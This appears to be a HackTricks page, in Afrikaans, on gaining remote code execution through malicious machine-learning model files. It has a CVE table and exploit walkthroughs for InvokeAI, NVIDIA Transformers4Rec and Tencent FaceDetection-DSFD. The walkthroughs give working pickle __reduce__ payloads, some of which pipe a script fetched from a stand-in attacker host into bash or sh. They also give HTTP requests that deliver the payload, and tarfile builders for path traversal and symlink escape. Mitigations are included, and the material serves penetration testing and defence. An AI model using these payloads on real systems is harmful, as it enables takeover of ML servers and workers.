# Modelle RCE

{{#include ../banners/hacktricks-training.md}}

## Modelle laai om RCE te verkry

Masjienleer-modelle word gewoonlik gedeel in verskillende formate, soos ONNX, TensorFlow, PyTorch, ens. Hierdie modelle kan in ontwikkelaars se masjiene of produksiestelsels gelaai word vir gebruik. Gewoonlik behoort die modelle nie kwaadwillige kode te bevat nie, maar daar is gevalle waar die model gebruik kan word om arbitraire kode op die stelsel uit te voer — hetsy as 'n beoogde funksie of as gevolg van 'n kwesbaarheid in die modelladingbiblioteek.

Op die tyd van skryf is dit 'n paar voorbeelde van hierdie tipe kwesbaarhede:

| **Framework / Tool**        | **Kwesbaarheid (CVE indien beskikbaar)**                                                    | **RCE Vector**                                                                                                                           | **Verwysings**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Onveilige deserialisering in* `torch.load` **(CVE-2025-32434)**                                                              | Kwaadwillige pickle in model-checkpoint lei tot kode-uitvoering (omseil `weights_only`-beskerming)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + kwaadwillige model-aflaai veroorsaak kode-uitvoering; Java-deserialisering RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Onveilige checkpoint-deserialisering via `torch.load` **(CVE-2025-23298)**                                           | Onbetroubare checkpoint aktiveer pickle reducer tydens `load_model_trainer_states_from_checkpoint` → kode-uitvoering in ML-werker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Laai van model vanuit YAML gebruik `yaml.unsafe_load` (kode-uitvoering) <br> Laai van model met **Lambda**-laag voer arbitrêre Python-kode uit          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Gemaakte `.tflite` model veroorsaak integer overflow → heap-beskadiging (potensiële RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Laai van model via `joblib.load` voer pickle uit met die aanvaller se `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (onveilige `np.load`) *betwis*                                                                              | `numpy.load` standaard laat gepicklede object arrays toe – kwaadwillige `.npy/.npz` trigger kode-uitvoering                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX-model se external-weights-pad kan uit die gids ontsnap (lees arbitrêre lêers) <br> Kwaadwillige ONNX-model tar kan arbitrêre lêers oorskryf (leidend tot RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model met custom operator vereis die laai van die aanvaller se native kode; komplekse modelgrafieke misbruik logika om onbedoelde berekeninge uit te voer   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Gebruik van model-load API met `--model-control` aangeskakel laat relatiewe pad-traversal toe om lêers te skryf (bv. oorskryf `.bashrc` vir RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Verkeerd gevormde GGUF model-lêer veroorsaak heap-bufferoorvloeie in parser, wat arbitraire kode-uitvoering op slagofferstelsel moontlik maak                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Kwaadwillige HDF5 (`.h5`) model met Lambda-laag kode word steeds uitgevoer by laai (Keras safe_mode dek nie ou formaat nie – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Baie ML-instrumente (bv. pickle-gebaseerde modelformate, Python `pickle.load`) voer arbitraire kode wat in modelfiles ingesluit is uit, tensy dit gemitigeer word | |

Boonop is daar sommige python pickle-gebaseerde modelle soos dié wat deur [PyTorch](https://github.com/pytorch/pytorch/security) gebruik word wat gebruik kan word om arbitraire kode op die stelsel uit te voer as hulle nie met `weights_only=True` gelaai word nie. Dus, enige pickle-gebaseerde model kan besonder vatbaar wees vir hierdie tipe aanvalle, selfs al is hulle nie in die tabel hierbo gelys nie.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` is 'n gewilde open-source web-koppelvlak vir Stable-Diffusion. Weergawes **5.3.1 – 5.4.2** openbaar die REST-endpoint `/api/v2/models/install` wat gebruikers toelaat om modelle van arbitrêre URL's af te laai en te laai.

Intern roep die endpoint uiteindelik aan:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wanneer die verskafte lêer 'n **PyTorch checkpoint (`*.ckpt`)** is, voer `torch.load` 'n **pickle deserialization** uit. Omdat die inhoud direk vanaf 'n gebruiker-beheerde URL kom, kan 'n aanvaller 'n kwaadwillige objek met 'n pasgemaakte `__reduce__`-metode in die checkpoint insluit; die metode word uitgevoer **during deserialization**, wat lei tot **remote code execution (RCE)** op die InvokeAI server.

Aan die kwesbaarheid is **CVE-2024-12029** toegewys (CVSS 9.8, EPSS 61.17 %).

#### Uitbuiting stap-vir-stap

1. Skep 'n kwaadwillige checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Host `payload.ckpt` op 'n HTTP-bediener wat jy beheer (bv. `http://ATTACKER/payload.ckpt`).
3. Trigger die kwesbare endpoint (geen verifikasie benodig):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wanneer InvokeAI die lêer aflaai roep dit `torch.load()` → die `os.system` gadget hardloop en die aanvaller verkry kode-uitvoering in die konteks van die InvokeAI-proses.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiseer die hele vloei.

#### Voorwaardes

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` bereikbaar deur die aanvaller  
•  Die proses het toestemming om shell-opdragte uit te voer

#### Mitigasies

* Opgradeer na **InvokeAI ≥ 5.4.3** – die patch stel `scan=True` as verstek en voer malware-skandering uit voor deserialisering.  
* Wanneer jy checkpoints programmaties laai, gebruik `torch.load(file, weights_only=True)` of die nuwe [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.  
* Handhaaf allow-lists / signatures vir modelbronne en hardloop die diens met minimale voorregte.

> ⚠️ Onthou dat **enige** Python pickle-gebaseerde formaat (insluitend baie `.pt`, `.pkl`, `.ckpt`, `.pth` lêers) inherent onveilig is om vanaf onbetroubare bronne te deserialiseer.

---

Voorbeeld van 'n ad-hoc mitigasie as jy ouer InvokeAI-weergawes agter 'n reverse proxy moet laat loop:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE deur onveilige `torch.load` (CVE-2025-23298)

NVIDIA se Transformers4Rec (deel van Merlin) het 'n onveilige checkpoint-loader blootgestel wat direk `torch.load()` op deur gebruikers verskafte paadjies aangeroep het. Omdat `torch.load` staatmaak op Python `pickle`, kan 'n deur 'n aanvaller beheerde checkpoint arbitraire kode uitvoer via 'n reducer tydens deserialisering.

Kwetsbare pad (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Waarom dit tot RCE lei: In Python pickle kan 'n object 'n reducer (`__reduce__`/`__setstate__`) definieer wat 'n callable en argumente teruggee. Die callable word uitgevoer tydens unpickling. As so 'n object in 'n checkpoint teenwoordig is, word dit uitgevoer voordat enige gewigte gebruik word.

Minimale kwaadwillige checkpoint-voorbeeld:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Afleweringsvektore en die omvang van die skade:
- Trojanized checkpoints/models gedeel via repos, buckets, or artifact registries
- Geautomatiseerde resume/deploy pipelines wat checkpoints outomaties laai
- Uitvoering vind plaas binne training/inference workers, dikwels met verhoogde voorregte (bv., root in containers)

Oplossing: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) het die direkte `torch.load()` vervang met 'n beperkte, allow-listed deserializer geïmplementeer in `transformers4rec/utils/serialization.py`. Die nuwe laaier valideer tipes/velde en verhoed dat willekeurige callables tydens laai aangeroep word.

Verdedigingsriglyne spesifiek vir PyTorch checkpoints:
- Moet nie unpickle onbetroubare data nie. Gebruik voorkeur nie-uitvoerbare formate soos [Safetensors](https://huggingface.co/docs/safetensors/index) of ONNX waar moontlik.
- As jy PyTorch-serialisering moet gebruik, maak seker `weights_only=True` (ondersteun in nuwer PyTorch) of gebruik 'n aangepaste allow-listed unpickler soortgelyk aan die Transformers4Rec-patch.
- Handhaaf model provenance/signatures en voer deserialisering in 'n sandbox uit (seccomp/AppArmor; nie-root gebruiker; beperkte FS en geen network egress).
- Monitor vir onverwagte child processes van ML dienste tydens checkpoint-laai; spoor `torch.load()`/`pickle` gebruik.

POC en kwesbare/patch verwysings:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Voorbeeld – opstel van 'n kwaadaardige PyTorch model

- Skep die model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Laai die model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD stel 'n `resnet` endpoint bloot wat deur die gebruiker beheerde data deserializes. ZDI het bevestig dat 'n remote attacker 'n slagoffer kan dwing om 'n kwaadwillige bladsy/lêer te laai, dit 'n crafted serialized blob na daardie endpoint te laat push, en deserialisation as `root` te trigger, wat tot volledige kompromittering lei.

Die eksploitasievloei weerspieël tipiese pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Enige gadget wat tydens deserialization bereikbaar is (constructors, `__setstate__`, framework callbacks, ens.) kan op dieselfde wyse gemisbruik word, ongeag of die transport HTTP, WebSocket, of 'n lêer wat in 'n waargeneemde gids geplaas is, was.

## Modelle na Path Traversal

Soos in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) kommentaar gelewer is, is die meeste modelformate wat deur verskillende AI-frameworks gebruik word gebaseer op argiewe, gewoonlik `.zip`. Daarom kan dit moontlik wees om hierdie formate te misbruik om path traversal attacks uit te voer, wat toelaat om willekeurige lêers van die stelsel te lees waarop die model gelaai word.

Byvoorbeeld, met die volgende kode kan jy 'n model skep wat 'n lêer in die `/tmp`-gids sal skep wanneer dit gelaai word:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Of, met die volgende kode kan jy 'n model skep wat 'n symlink na die gids `/tmp` sal skep wanneer dit gelaai word:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Diepduik: Keras .keras deserialization and gadget hunting

Vir 'n gefokusde gids oor .keras internals, Lambda-layer RCE, die arbitrary import issue in ≤ 3.8, en post-fix gadget discovery inside die allowlist, sien:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Verwysings

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
